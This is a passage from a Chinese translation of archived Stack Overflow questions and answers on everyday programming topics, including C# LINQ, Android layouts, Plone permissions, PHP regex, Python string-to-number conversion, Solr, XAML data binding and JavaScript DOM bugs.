获取捕获图像路径可能是个问题。所以试试这个 getImagepath() 函数。

希望这能解决您的问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-12T18:34:18.730

这似乎是您服务器上的防火墙问题。连接被拒绝意味着您已到达计算机，但没有运行任何服务来接受连接，或者它被防火墙阻止。

# c# - 使用 linq 定义文本中元素的最后一个索引

> ID：15357401
> 
> 赞同：0
> 
> 时间：2013-03-12T09:23:22.257
> 
> 标签：c#, linq

我有这样的结构：

```
FileStream fs = new FileStream(fileName, FileMode.Open);
            StreamReader sr = new StreamReader(fs);
            while (!sr.EndOfStream)
            {
                string line=sr.ReadLine();
                fullTextLines.Add(line);
            } 
```

和一些文字：

```
string txt = "begin

middle

i am a string          

i am a string end" 
```

我想得到包含“我是”的最后一行索引。例如：我必须得到 3，但是当我使用时`Console.WriteLine(fullTextLines.LastIndexOf("GRID"));`我得到 -1。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-12T09:33:04.090

```
fullTextLines.FindLastIndex(x => x.Contains("i am")); 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-03-12T09:29:02.217

```
var result = File.ReadLines(fileName)
                 .Select((s,i) => new { Line = s, Index = i })
                 .LastOrDefault(x => x.Line.Contains("i am"));

int index = result == null ? -1 : result.Index; 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-12T09:26:57.227

```
var lastIAmIndex = fullTextLines.Select((s,i) => new { s, i })
                                .Where(e => e.s.Contains("i am"))
                                .Select(e => e.i)
                                .OrderByDescending(i => i)
                                .FirstOrDefault() 
```

# android - LinearLayout - 滚动时动态添加内容

> ID：15357405
> 
> 赞同：-1
> 
> 时间：2013-03-12T09:23:34.983
> 
> 标签：android, android-layout

我的应用程序具有线性布局的屏幕，其中显示了我的所有控件（复选框、单选按钮、下拉列表等）。当我们显示屏幕时，它会加载所有控件（1000 个控件）并显示它。它需要更多时间来加载和显示所有控件。所以代替这个，是否可以在屏幕上只显示 10 个控件，当我们向下滚动时，另外 10 个控件被动态加载并显示在屏幕上。

我正在使用线性布局，我不想使用列表视图。

**编辑**

我不能使用列表视图，因为我的所有控件都不是单行。例如复选框控件作为第 1 行，日期显示在第 2 行，单选按钮或编辑文本作为第 3 行等。这些所有控件都来自服务器动态。所以在这里我不能像你建议的那样使用列表视图。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-15T16:05:59.673

您的编辑论点是错误的。行是一个逻辑单元，而不是预定义的东西。您在行内放置的内容，甚至超过您的控制权，完全取决于您。

您确实需要使用 ListView 并动态更改您在行中显示的内容。就像你说的：在第 1 行你放了一个复选框，第 2 行得到一个日期显示，第 3 行有两个像 TextView 和开/关切换的想法。由您决定，但要认真地构建：使用 ListView！

除此之外：这样的用户体验会很糟糕，并且是“不要”列表的完美示例。以某种方式构建来自服务器的控件。每个设置屏幕都有一些类别，如“声音”、“视频”、“通知”……让您的控件也一样！我真的怀疑您无法以某种方式对您获得的控件进行分类。

你应该努力防止用户体验灾难......

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-12T09:33:24.293

当然可以，但是您将只是实现诸如延迟加载之类的事情，并最终得到一个调整后的 LinearLayout，它可以根据您的滚动位置滚动和加载您的数据。为了做得好，您将创建一些单独的类，您可以将其称为 Adapter 并为您处理加载。

然后你意识到你创建了一个糟糕的 ListView 版本。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-12T09:37:23.707

我认为在容器中动态加载不同类型视图的最优雅的解决方案是使用某种可以扩展的容器[`AdapterView`](http://developer.android.com/reference/android/widget/AdapterView.html)。这样您就可以实现一个[`Adapter`](http://developer.android.com/reference/android/widget/Adapter.html)可以创建您需要的所有视图的方法。这是一种非常有效的方法，因为它重用了滚动超出边界的视图，而不是创建它需要的每个视图。

在我的代码中，我使用了一个可以扩展的容器，`AdapterView<ListAdapter>`并且效果很好。

# c++ - 向右滑动导航窗格并从左侧移动 ListView

> ID：15357411
> 
> 赞同：0
> 
> 时间：2013-03-12T09:23:53.893
> 
> 标签：c++, blackberry-10, blackberry-cascades

在下图中，想象一下我作为 ListView 实现的菜单。在右侧（向右滑动的对话框，用于显示菜单），我有一个*NavigationPane*。

例如，如果我在一页中有两个容器，我学会了如何滑动页面。但是是否可以使用我上面提到的 NavigationPane 和 ListView 创建动画（例如，将 NavigationPane 滑动到右侧，以便 ListView 从左侧出来）？如果是，如何？任何代码示例？我可能需要用 C++ 完成这一切。

![在此处输入图像描述](../Images/d4d0988cbe546743348674b3f9caf0dd.png)

# permissions - 如何隐藏其他经过身份验证的用户的内容，除了它的所有者？

> ID：15357414
> 
> 赞同：0
> 
> 时间：2013-03-12T09:24:00.213
> 
> 标签：permissions, plone

克隆 4.2

我创建了一个文件夹并为登录用户启用“共享”-“可以添加”来上传文件。现在我希望经过身份验证的用户 A 上传的文件对其他经过身份验证的用户是不可见的。这可能吗？如果是这样，如何？

最好的祝福。

雨果

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-12T10:17:51.600

使用 Intranet_workflow。

然后通过私有状态的权限选项卡减去贡献者的“查看”权限：

[http://yourhost.org:8888/yourSiteId/portal_workflow/intranet_workflow/states/private/manage_properties](http://yourhost.org:8888/yourSiteId/portal_workflow/intranet_workflow/states/private/manage_properties)

之后通过点击底部的按钮更新安全设置：

[http://yourhost.org:8888/yourSiteId//portal_workflow/manage_selectWorkflows](http://yourhost.org:8888/yourSiteId//portal_workflow/manage_selectWorkflows)

这实际上应该是默认行为，恕我直言。如果你有动力，你可能会提出这个建议。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-12T11:03:59.513

默认情况下，克隆文件内容没有工作流。

您必须对他们应用工作流，工作流的种类并不重要，更重要的是初始状态必须是“私有”状态，其中没有人（除了所有者和经理+站点管理员）具有“查看”权限。

# php - 创建正则表达式

> ID：15357420
> 
> 赞同：2
> 
> 时间：2013-03-12T09:24:33.760
> 
> 标签：php, regex

我正在尝试创建一个正则表达式来接受

一个整数

> 123

或者

一个整数，然后下划线，然后是另一个整数

> 123_45

这是我所拥有的

```
/^[0-9]+_*[0-9]*$/ 
```

我如何使`_*[0-9]*`（第二部分）可选

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-12T09:29:17.740

使用这个正则表达式`^\d+(_\d+)?$`

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-12T09:27:45.273

你有没有尝试过

```
/^[0-9]+(_[0-9]+)?$/ 
```

`()?`取自[http://www.regular-expressions.info/optional.html](http://www.regular-expressions.info/optional.html)的可选语法

但正如接受的答案中所述，`\d`可以用作简写，`[0-9]`所以这可能是

```
/^\d+(_\d+)?$/ 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-12T09:53:00.433

检查这个表达式，

> /^[0-9]+(_([0-9])+)?$/

它不会匹配 123_

# python - Python，确定字符串是否应转换为 Int 或 Float

> ID：15357422
> 
> 赞同：21
> 
> 时间：2013-03-12T09:24:45.087
> 
> 标签：python, type-conversion, decimal-point

我想将字符串转换为最紧凑的数据类型：int 或 float。

我有两个字符串：

```
value1="0.80"     #this needs to be a float
value2="1.00"     #this needs to be an integer. 
```

我如何确定在 Python 中 value1 应该是 Float 而 value2 应该是 Integer？

* * *

## 回答 #1

> 赞同：30
> 
> 时间：2013-03-12T09:27:48.113

```
def isfloat(x):
    try:
        a = float(x)
    except (TypeError, ValueError):
        return False
    else:
        return True

def isint(x):
    try:
        a = float(x)
        b = int(a)
    except (TypeError, ValueError):
        return False
    else:
        return a == b 
```

* * *

## 回答 #2

> 赞同：23
> 
> 时间：2013-03-12T10:17:02.990

Python`float`对象有一个[`is_integer`方法](http://docs.python.org/2/library/stdtypes.html#float.is_integer)：

```
from ast import literal_eval
def parses_to_integer(s):
    val = literal_eval(s)
    return isinstance(val, int) or (isinstance(val, float) and val.is_integer()) 
```

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2016-02-06T04:24:35.420

```
def coerce(x):
    try:
        a = float(x)
        b = int(x)
        if a != b:
            return a
        else:
            return b
    except:
        raise ValueError("failed to coerce str to int or float") 
```

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2017-01-05T00:28:08.827

当我试图确定两个 XML 文档之间的差异时，我必须处理确保将“1.0”转换为“1”的情况。所以我写了这个函数来帮助我。我还认为，当所讨论的字符串文字为“真”或“假”时，其他一些解决方案将失败。无论如何，这个功能对我来说效果很好。我希望它也能帮助你。

```
from ast import literal_eval

def convertString(s):
    '''
    This function will try to convert a string literal to a number or a bool
    such that '1.0' and '1' will both return 1.

    The point of this is to ensure that '1.0' and '1' return as int(1) and that
    'False' and 'True' are returned as bools not numbers.

    This is useful for generating text that may contain numbers for diff
    purposes.  For example you may want to dump two XML documents to text files
    then do a diff.  In this case you would want <blah value='1.0'/> to match
    <blah value='1'/>.

    The solution for me is to convert the 1.0 to 1 so that diff doesn't see a
    difference.

    If s doesn't evaluate to a literal then s will simply be returned UNLESS the
    literal is a float with no fractional part.  (i.e. 1.0 will become 1)

    If s evaluates to float or a float literal (i.e. '1.1') then a float will be
    returned if and only if the float has no fractional part.

    if s evaluates as a valid literal then the literal will be returned. (e.g.
    '1' will become 1 and 'False' will become False)
    '''

    if isinstance(s, str):
        # It's a string.  Does it represnt a literal?
        #
        try:
            val = literal_eval(s)
        except:
            # s doesn't represnt any sort of literal so no conversion will be
            # done.
            #
            val = s
    else:
        # It's already something other than a string
        #
        val = s

    ##
    # Is the float actually an int? (i.e. is the float 1.0 ?)
    #
    if isinstance(val, float):
        if val.is_integer(): 
            return int(val)

        # It really is a float
        return val

    return val 
```

此函数的单元测试的输出产生：

```
convertString("1")=1; we expect 1
convertString("1.0")=1; we expect 1
convertString("1.1")=1.1; we expect 1.1
convertString("010")=8; we expect 8
convertString("0xDEADBEEF")=3735928559; we expect 3735928559
convertString("hello")="hello"; we expect "hello"
convertString("false")="false"; we expect "false"
convertString("true")="true"; we expect "true"
convertString("False")=False; we expect False
convertString("True")=True; we expect True
convertString(sri.gui3.xmlSamples.test_convertString.A)=sri.gui3.xmlSamples.test_convertString.A; we expect sri.gui3.xmlSamples.test_convertString.A
convertString(<function B at 0x7fd9e2f27ed8>)=<function B at 0x7fd9e2f27ed8>; we expect <function B at 0x7fd9e2f27ed8>
convertString(1)=1; we expect 1
convertString(1.0)=1; we expect 1
convertString(1.1)=1.1; we expect 1.1
convertString(3735928559)=3735928559; we expect 3735928559
convertString(False)=False; we expect False
convertString(True)=True; we expect True 
```

单元测试代码如下：

```
import unittest

# just  class for testing that the class gets returned unmolested.
#
class A: pass

# Just a function
#
def B(): pass

class Test(unittest.TestCase):

    def setUp(self):
        self.conversions = [
            # input      | expected
            ('1'         ,1         ),
            ('1.0'       ,1         ), # float with no fractional part
            ('1.1'       ,1.1       ),
            ('010'       ,8         ), # octal
            ('0xDEADBEEF',0xDEADBEEF), # hex
            ('hello'     ,'hello'   ),
            ('false'     ,'false'   ),
            ('true'      ,'true'    ),
            ('False'     ,False     ), # bool
            ('True'      ,True      ), # bool
            (A           ,A         ), # class
            (B           ,B         ), # function
            (1           ,1         ),
            (1.0         ,1         ), # float with no fractional part
            (1.1         ,1.1       ),
            (0xDEADBEEF  ,0xDEADBEEF),
            (False       ,False     ),
            (True        ,True      ),
        ]

    def testName(self):
        for s,expected in self.conversions:
            rval = convertString(s)
            print 'convertString({s})={rval}; we expect {expected}'.format(**locals())
            self.assertEqual(rval, expected)

if __name__ == "__main__":
    #import sys;sys.argv = ['', 'Test.testName']
    unittest.main() 
```

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2019-09-12T11:45:48.037

另一种方法是使用这样的正则表达式：

```
import re
def parse_str(num):
    """
    Parse a string that is expected to contain a number.
    :param num: str. the number in string.
    :return: float or int. Parsed num.
    """
    if not isinstance(num, str): # optional - check type
        raise TypeError('num should be a str. Got {}.'.format(type(num)))
    if re.compile('^\s*\d+\s*$').search(num):
        return int(num)
    if re.compile('^\s*(\d*\.\d+)|(\d+\.\d*)\s*$').search(num):
        return float(num)
    raise ValueError('num is not a number. Got {}.'.format(num)) # optional 
```

## 正则表达式模式的注意事项

```
^      beginning of string
$      end of string
\s*    none or more spaces
\d+    one or many digits
\d*    none or many digits
\.     literal dot
|      or 
```

## 测试

```
print(parse_str('1'))
print(parse_str('999'))
print(parse_str('1.2'))
print(parse_str('.3'))
print(parse_str('4.'))
print(parse_str('12.34'))
print(parse_str('    0.5    '))
print(parse_str('XYZ')) 
```

## 结果

```
1
999
1.2
0.3
4.0
12.34
0.5
ValueError: num is not a number. Got XYZ. 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2020-02-06T08:06:09.610

```
lineVal = ['1850', '-0.373', '-0.339', '-0.425']

lineVal2 = [ float(x) if re.search(r'\.',x) else int(x) for x in lineVal ]

LineVal2 output ==> [1850, -0.373, -0.339, -0.425] 
```

我是新蜜蜂，我试过了，似乎对我有用。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2018-02-09T05:36:42.770

这是一个有趣的解决方案，使用`eval()`. 注意：使用 eval 非常危险，不建议在生产环境或任何`eval()`可能接收用户输入的地方使用！仅将其视为学术上有趣的答案。

```
def get_string_type(x):
    if type(x) != str:
        raise ValueError('Input must be a string!')
    try:
        string_type = type(eval(x))
    except NameError:
        string_type = str
    return string_type 
```

由于 Eval 将字符串视为原始代码，因此这适用于您可以输入到 repl 中的任何类型。例子

```
>>> from decimal import Decimal
>>> my_test_string = 'Decimal(0.5)'
>>> type(my_test_string)
<class 'str'>
>>> get_string_type(my_test_string)
<class 'decimal.Decimal'> 
```

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2020-05-14T00:27:21.483

我开始考虑请求是将存储为字符串的数字转换为枯萎的 or ，以最严格的数据类型为准。以下函数满足请求（但不检查输入是否为有效值，即数字而非字母字符）。

将`str_to_float_or_int()`存储为字符串的数字转换为 a`<float>`或`<int>`。尽管所有整数都可以是浮点数，但`<int>`尽可能返回 an 以满足“转换为最严格的数据类型”标准，例如：

*   输入 = 一个整数。
*   输入 = 尾数为 0 ('1.0') 的特征
*   输入 = 没有尾数的特征 ('1.')

该技术使用`str.isdecimal()`来确定字符串是否为值（相对于空值）以及`<str>.split(".")`将字符串值（候选编号）解析为两部分的方法：

1.  整数 = 小数点前的数字
2.  尾数 = 小数点后的数字

内置`<str>.split(".")`方法返回一个列表。在这种情况下，列表的格式如下： `[integer, mantissa]`

注意：从技术上讲，这里使用的“整数”一词实际上是指“特征”。我使用了“整数”，因为它的字符更少，因此更容易在编码中使用。

```
def str_to_float_or_int(value_str, ShowExtended=False):
    # Convert a number stored as a string to a <float> or an <int> 
    # whichever is the "tightest" data type. 

    # Default condition is that the number is a <float>
    isfloat = True
    value = float(value_str)
    numberParsed = value_str.split(".")
    if len(numberParsed) > 1:
        integer = numberParsed[0]
        mantissa = numberParsed[1]
        if integer.isdecimal() and mantissa.isdecimal():
            if int(mantissa) == 0:
                # value is an integer; mantissa is 0
                isfloat = False
                value = int(integer)
            elif integer.isdecimal():
                # value is an integer because a value is only
                # returned for 'integer' variable by .split(), 
                # the returned mantissa value is null.
                isfloat = False
                value = int(integer)
        else:
            # value is an integer because .split() returned
            # a single value list.
            isfloat = False
            value = int(value_str)
        if ShowExtended:
            print("testValue: " + value_str + " | splits into: ", 
                   numberParsed,"\n value: ", value)
            if isfloat:
                print("It's a <float> (;o)\n")
            else:
                print("It's an <int> {:o)~\n")
        return value 
```

* * *

从控制台运行脚本以测试 str_to_float_or_int()

* * *

```
testValues = ["0.80", "1.00", "5", ".1", "4."]
print("\n-----------------------------------------------\n" +
        "| Testcase:  ", testValues, " |\n" +
        "-----------------------------------------------")
for number in testValues:
    str_to_float_or_int(number, ShowExtended=True) 
```

> * * *
> 
> 输出结果（从控制台复制）
> 
> * * *

```
>   ---------------------------------------------------
>   |  Testcase:   ['0.80', '1.00', '5', '.1', '4.']  |
>   ---------------------------------------------------
>   testValue: 0.80 | splits into:  ['0', '80']
>   value:  0.8
>   It's a <float> (;o)
>   
>   testValue: 1.00 | splits into:  ['1', '00']
>   value:  1
>   It's an <int> {:o)~
>   
>   testValue: 5 | splits into:  ['5']
>   value:  5
>   It's an <int> {:o)~
>   
>   testValue: .1 | splits into:  ['', '1']
>   value:  0.1
>   It's a <float> (;o)
>
>   testValue: 4\. | splits into:  ['4', '']
>   value:  4
>   It's an <int> {:o)~ 
```

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2021-03-22T07:53:05.863

这个简单的功能可以解决问题，您只需要“解决方案”代码块。

intOrfloat.py：

```
import sys
def NumberType(argv):
    Number = argv[1]
    try:
        float(Number)   # Exception if not a number
        ################ Solution ################
        if '.' not in Number:
            return '%s is Integer'%(Number)
        if int(Number.split('.')[1]) > 0:
            return '%s is Float'%(Number)
        else:
            return '%s is Integer'%(Number)
        ##########################################
    except Exception as e:
        return '%s is Text...'%(Number)
if __name__ == '__main__':
    print(NumberType(sys.argv)) 
```

测试：

```
>python intOrfloat.py 0.80
0.80 is Float

>python intOrfloat.py 1.00
1.00 is Integer

>python intOrfloat.py 9999999999999999
9999999999999999 is Integer 
```

因此，无需担心整数的大小。

```
'.' not in Number              # number without decimal must be an integer
Number.split('.')              # split into [integer String, decimal String]
Number.split('.')[1]           # get decimal String
int(Number.split('.')[1])      # convert it into decimal Number
int(Number.split('.')[1]) > 0  # decimal Number > 0 = Float; Otherwise, Integer 
```

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2022-02-09T12:58:30.317

短函数示例：返回字符串的数字类型（float 或 int），对于非数字字符串，返回 str 类型。

```
def numeric_type_of_string(string: str):
    if string.isnumeric():
        return int
    try:
        val = float(string)
        return int if val == int(val) else float
    except (TypeError, ValueError):
        return str 
```

如果您直接想要转换后的值，只需修改返回值：

```
def string_to_numeric_if_possible(string: str):
    if string.isnumeric():
        return int(string)
    try:
        val = float(string)
        return int(val) if val == int(val) else val
    except (TypeError, ValueError):
        return string 
```

# java - 使用 Java 程序中的参数调用 Javascript 函数

> ID：15357424
> 
> 赞同：0
> 
> 时间：2013-03-12T09:24:46.607
> 
> 标签：java, javascript

我有 Java Swing 应用程序。当用户单击 MenuItem 时，我想使用 JavaScript 在 HTML 页面上显示图形。Java代码：

```
 if(e.getActionCommand().equals("show graph")){
        if(mainPopulation != null) {
            double[] myPoints = mainPopulation.getElements();
            Desktop d = Desktop.getDesktop();
            try {
                d.open(new File("D:/fp.html"));
            } catch (IOException e1) {
                e1.printStackTrace();
            }
        }
    } 
```

JavaScript 代码：

```
<html>
 <head>
  <script type="application/x-javascript">
    function draw(params) {
      var canvas = document.getElementById("canvas");
      if (canvas.getContext) {
        var ctx = canvas.getContext("2d");
        ctx.font = '10pt Calibri';
        ctx.fillStyle = 'blue'; 
        for(i=0;i<params.length;i++){
            ctx.beginPath();
            ctx.moveTo(params[i], params[i+1]);
            ctx.lineTo(params[i + 2], params[i + 3]);
            ctx.stroke();           
            ctx.fillText('(' + params[i].toString() + ';' + params[i +1].toString() + ')', params[i], params[i+1]);
            i += 1;
        }
      }
    }
  </script>
 </head>
 <body onload="draw([10,10,20,20,30,30,40,40,40,100,50,90,70,90,60,50]);">
   <canvas id="canvas" width="1000" height="1000"></canvas>
 </body>
</html> 
```

如何使用参数调用函数**draw**（在**body onload**上）**double[] myPoints**上），从 Java 程序动态更改 HTML？

谢谢。

# solr - 更新 DocValues：在 Solr 中存储文档的“点击”

> ID：15357429
> 
> 赞同：1
> 
> 时间：2013-03-12T09:24:59.600
> 
> 标签：solr, lucene

今天我阅读了[Apache Lucene 和 Solr 4.2 的公告以及 Solr](http://solr.pl/en/2013/03/12/apache-lucene-and-solr-4/)中新的 DocValues 支持。

我想在 Solr 中存储每个文档的点击次数。现在可以使用 DocValues 吗？我什至可以更新它们（不删除文档）吗？

两年前，我在伟大的“Lucene in action”一书中读到 Lucene 不支持更新。我想知道 DocValues（或其他东西）是否会改变这一点？还是在关系数据库中更好地存储每个文档的点击次数统计信息更好？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-12T12:57:43.973

我通读了关于[SOLR-3855](https://issues.apache.org/jira/browse/SOLR-3855)的所有评论，发现下面的一条说明

> 不幸的是，文档值不可更新。

我认为存储每个文档的点击次数的可行选项是[ExternalFileField](http://docs.lucidworks.com/display/solr/Working+with+External+Files+and+Processes)类型。主要限制是

> 外部字段不可搜索。它们只能用于函数查询或显示。

# google-chrome - Chrome DNS 获取保留旧的 dns 信息

> ID：15357433
> 
> 赞同：2
> 
> 时间：2013-03-12T09:25:17.607
> 
> 标签：google-chrome

我最近更新了域的 cname 记录。dns 更改已对其他浏览器产生影响，并且在使用以前从未访问过该站点的配置文件时对 chrome 产生影响。但是对于我的主浏览器，chrome（macos 10.8，chrome v25）保留了旧的 dns 并且没有更新。

我已经阅读了涉及清除缓存等的修复，但我担心的是，如果它发生在我身上，它也会发生在网站的用户身上。

所以我的问题是，Chrome 会继续存储旧的 DNS 设置多久？有没有办法强制 chrome 以一种对普通用户来说简单的方式刷新其 DNS？

* * *

## 回答 #1

> 赞同：-2
> 
> 时间：2015-11-08T03:28:16.140

在 chrome 浏览器的地址栏中输入**chrome://net-internals/#dns**。

单击“清除主机缓存”按钮

[截屏](http://i.stack.imgur.com/mc3dM.png)

# javascript - JSON 格式的 Shopify 区域（国家/地区）

> ID：15357435
> 
> 赞同：0
> 
> 时间：2013-03-12T09:25:28.667
> 
> 标签：javascript, shopify, geoip, country-codes

我正在尝试在 Shopify 中实施 JavaScript 解决方案，以将我的客户的当前位置（通过使用[http://freegeoip.net/json](http://freegeoip.net/json)的 country.code ）与我的商店也提供的一系列国家/地区相匹配。

我需要完成的是 JSON 格式的“地区和税收”选项卡中所有国家/地区的国家代码列表，然后我可以在我的 JavaScript 文件中使用。

只是为了（可能）让它稍微复杂一点，我们将有五个不同的商店，每个商店都有不同的区域，但都使用从单一源代码控制上传的相同模板集。因此，我编写的任何代码都需要在所有商店中通用（即，将相关的 JSON 对象获取到该商店）。然后我可以向人们显示国家选择器或不显示，这取决于他们是否在正确的站点上

这可能是 Shopify / JavaScript 大师吗？

谢谢 ：-）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-13T07:27:20.197

Shopify API 使您可以访问“地区和税收”选项卡中列出的所有国家/地区的列表。您可以在[Shopify API 页面](http://docs.shopify.com/api/country)上找到 API 的详细说明。此列表包括一个国家/地区的所有配置参数（税费、运费）。

有一个问题：此 API 不可“公开”访问。如果您想在您的商店中使用此 JSON 的输出，您必须先将其设为“公开”。例如，您可以创建一个应用程序或代理来完成此操作。

如果您只对运费感兴趣，您还可以使用[Shopify 的 AJAX API](http://wiki.shopify.com/Ajax_API#GET_.2Fcart.2Fshipping_rates.json) `GET /cart/shipping_rates.json`来获取估计的运费。

# xaml - 我应该如何在 Windows 应用商店应用程序中显示带有绑定数据的格式化文本？

> ID：15357437
> 
> 赞同：1
> 
> 时间：2013-03-12T09:25:31.770
> 
> 标签：xaml, mvvm, windows-runtime, windows-store-apps, winrt-xaml

我想将 a 的内容绑定`TextBlock`到包含多个数据绑定视图模型属性的格式化字符串。我也在尝试使用 MVVM 模式。

例如，我想将文本数据绑定到这样的东西：`String.Format("{0} / {1}", Usage, Total`， where`Usage`和`Total`are view-model 属性。

我尝试过使用`Run`s，但绑定它们的`Text`属性似乎不起作用，并且 XAML 与以下相比是混乱的`String.Format`：

```
<TextBlock>
    <Run Text="{Binding Usage}" />
    <Run Text=" / " />
    <Run Text="{Binding Total}" />
</TextBlock> 
```

我考虑过添加一个额外的视图模型属性来进行文本格式化，但它似乎不合适；我希望视图包含表示逻辑。

我该怎么做？请注意，我喜欢可维护、整洁、优雅和有组织的解决方案。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-12T09:53:57.983

我会按照您个人的建议在您的 ViewModel 上添加一个附加属性。您的视图模型将始终与您的视图紧密耦合，因此我也不认为这是一件坏事。

如果您真的不想，那么您可以在堆栈面板中使用多个文本框，其方向为水平方向。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-13T16:53:30.647

当您说绑定 Run 控件的 Text 属性“不起作用”时，您确定绑定到正确的对象吗？（我还包括一个明显的问题，即您的属性是否在视图模型中正确声明，但我假设您已经检查并确保了足够范围的 getter/setter）。我在几个应用程序中广泛使用这种方法，并且没有遇到任何问题。您是否在输出窗口中遇到任何可能有助于缩小原因的绑定错误？

我建议在您完全确定您不能对视图执行您想要的操作之前不要向您的视图模型添加属性 - 如果稍后需求发生变化并且您想要（例如）应用前景色变换器怎么办价值观之一？

**编辑**

我刚刚整理了一个简单的演示项目，展示了它的工作原理。在 VS -> 文件 -> 新建 -> 项目 -> 空白应用程序 (XAML) 中编辑 MainPage.xaml 和 MainPage.Xaml.cs。文件的全文如下...

主页.Xaml

```
<Page
    x:Class="RunDemo.MainPage"
    xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
    xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
    xmlns:local="using:RunDemo"
    xmlns:d="http://schemas.microsoft.com/expression/blend/2008"
    xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006"
    mc:Ignorable="d">

    <Grid Background="{StaticResource ApplicationPageBackgroundThemeBrush}">
        <!-- added from here... -->
        <TextBlock FontSize="36" HorizontalAlignment="Center" VerticalAlignment="Center">
            <Run Text="{Binding Usage}"/>
            <Run Text=" / "/>
            <Run Text="{Binding Total}"/>
        </TextBlock>
        <!-- ...to here. -->
    </Grid>
</Page> 
```

主页，xaml.cs

```
using System.ComponentModel;
using Windows.UI.Xaml.Controls;
using Windows.UI.Xaml.Navigation;

// The Blank Page item template is documented at http://go.microsoft.com/fwlink/?LinkId=234238

namespace RunDemo
{
    /// <summary>
    /// An empty page that can be used on its own or navigated to within a Frame.
    /// </summary>
    public sealed partial class MainPage : Page
    {
        public MainPage()
        {
            this.InitializeComponent();
        }

        /// <summary>
        /// Invoked when this page is about to be displayed in a Frame.
        /// </summary>
        /// <param name="e">Event data that describes how this page was reached.  The Parameter
        /// property is typically used to configure the page.</param>
        protected override void OnNavigatedTo(NavigationEventArgs e)
        {
            base.OnNavigatedTo(e);
            DataContext = new DummyViewModel();
        }
    }

    public class DummyViewModel : INotifyPropertyChanged
    {
        private int total = 15;
        private string usage = "ten";
        public int Total
        {
            get
            {
                return total;
            }
            set
            {
                total = value;
                OnPropertyChanged("Total");
            }
        }
        public string Usage
        {
            get
            {
                return usage;
            }
            set
            {
                usage = value;
                OnPropertyChanged("Usage");
            }
        }

        public event PropertyChangedEventHandler PropertyChanged;
        private void OnPropertyChanged(string propertyName)
        {
            if(null != PropertyChanged)
                PropertyChanged(this, new PropertyChangedEventArgs(propertyName));
        }
    }
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-12T09:29:55.887

您可以使用对象的`StringFormat`属性`Binding`来格式化您的字符串。在您的情况下，您当然需要使用`MultiBinding`.

```
<MultiBinding StringFormat="{}{0} / {1}">
    <Binding Path="Usage" />
    <Binding Path="Total" />
</MultiBinding> 
```

# javascript - Javascript CreateElement 创建空表

> ID：15357438
> 
> 赞同：0
> 
> 时间：2013-03-12T09:25:33.567
> 
> 标签：javascript, html, html-table, createelement, pre

我正在尝试使用 pre html 标记来包含一些我要格式化的代码。我从预先存在的 pre 标签中获取代码，并制作一个包含代码的表格，然后对其进行格式化。但是每隔一次我创建一个 td 元素，其中包含一些文本，就会创建一个空表。我的代码如下：

```
function init() {
    var pres = document.getElementsByTagName('pre');

    for (var i = 0; i < pres.length; i++) {
        var elem = pres[i];
        var ourTable = document.createElement('table');

        if (elem.className.toLowerCase() == 'code') {
            var lineCount = 1;
            var linesOfText = elem.innerHTML.split(/\r|\n/);

            for (var j = 0; j < linesOfText.length; j++) { 
                var ourRow = document.createElement('tr');
                var lineNumberTd = document.createElement('td');
                var lineNumberNode = document.createTextNode(lineCount);
                lineNumberTd.appendChild(lineNumberNode);

                ourRow.appendChild(lineNumberTd);

                var code = linesOfText[j];

                var codeTd = document.createElement('td');
                var ourPre = document.createElement('pre');
                ourPre.innerHTML = code;
                codeTd.appendChild(ourPre);
                ourRow.appendChild(codeTd);

                lineCount++;
                ourTable.appendChild(ourRow);
            }
        }

        elem.parentNode.replaceChild(ourTable, elem);
    }
}
window.onload = init; 
```

我的HTML如下：

```
<html xmlns="http://www.w3.org/1999/xhtml">
    <head runat="server">
        <link rel="stylesheet" href="DefaultStyle.css" />
    <title>Autoformatter</title>
</head>
<body>
    <form id="form1" runat="server">
        <div>
            <pre class="code">
                        while (!stop)
            {
                while (packetQueue.Count > 0)
                {
                    HandlePacket(packetQueue.Dequeue());
                }
            }
        </pre>
        </div>
    </form>
    <script type="text/javascript" src="PrimaryScript.js" ></script>
</body>
</html> 
```

这会产生这样的东西：

![代码的结果](../Images/c8f9c0e8c04da7daf9966efcbf0277d3.png)

第 4、6 和 8 行的第 2 行也有空桌子。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-12T09:52:23.833

问题是您使用的是NodeList：

```
var pres = document.getElementsByTagName('pre');

for (var i = 0; i < pres.length; i++) { 
```

NodeLists 是“实时”集合，也就是说它们会发生变化。一开始你有一个 pre 标签，所以`pres.length`返回 1。但在循环中你添加 pre 标签。所以`pres.length`也会发生变化。因此，您的循环一次又一次地运行。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-12T09:38:55.933

好的，所以我自己想出了问题的答案。

显然，在某种程度上，这条线

```
elem.parentNode.replaceChild(ourTable, elem); 
```

运行的次数超过了它应该运行的次数，因此它用一个空表替换了新制作的前置元素，因为新制作的前置元素没有设置 class='code' 属性。

把那条线放到

```
